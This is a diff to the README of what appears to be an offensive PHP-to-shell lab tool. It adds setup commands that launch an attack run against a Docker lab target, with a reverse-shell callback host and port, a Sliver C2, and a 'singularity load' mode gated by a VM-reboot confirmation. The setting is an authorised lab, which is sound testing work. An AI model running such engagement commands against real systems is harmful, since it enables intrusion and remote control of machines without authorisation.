@@ -7,14 +7,32 @@ Everything below is captured from the real run on 2026-10-27.
 
 ## Setup
 
+**ASCII-Menü (empfohlen für Lab + LOAD):**
+
+```bash
+./vtbw-php2shell-lab up                   # FPM target
+./php2shell-unchained                     # [e] → [l] Lab-Vollkette + LOAD
+```
+
+`[l]` setzt Scope `172.21.0.0/24`, `ENGAGE_MODPHP=on`, `ENGAGE_SINGULARITY=load`,
+`CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK` und startet `engage run` gegen
+`http://172.21.0.2/` (anpassbar).
+
+**CLI (gleiches Profil):**
+
 ```bash
 docker compose up -d                      # vtbw-php2shell-target (healthy)
 echo '172.21.0.0/24  # RoE LAB-E2E' >> scope-authorized.txt
 CONFIRM_ROE=I-AM-AUTHORIZED \
+CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK \
+ENGAGE_SINGULARITY=load ENGAGE_MODPHP=on \
 ENGAGE_LHOST=172.21.0.1 ENGAGE_LPORT=4444 \
 ENGAGE_C2=sliver ENGAGE_SID=e2e-20261027 ENGAGE_TERMINAL=tmux \
   vtbw-php2shell-lab engage run 'http://172.21.0.2/'
 ```
+
+mod_php lab: `target-apache/` mounts + `127.0.0.1:19288` (`scripts/lab-apache-up.sh`
+wartet auf `OK` vor PoC).
 
 Host note: on the test machine the native daemon did not publish
 `127.0.0.1:19281` (`docker inspect` showed `80/tcp: null` despite correct
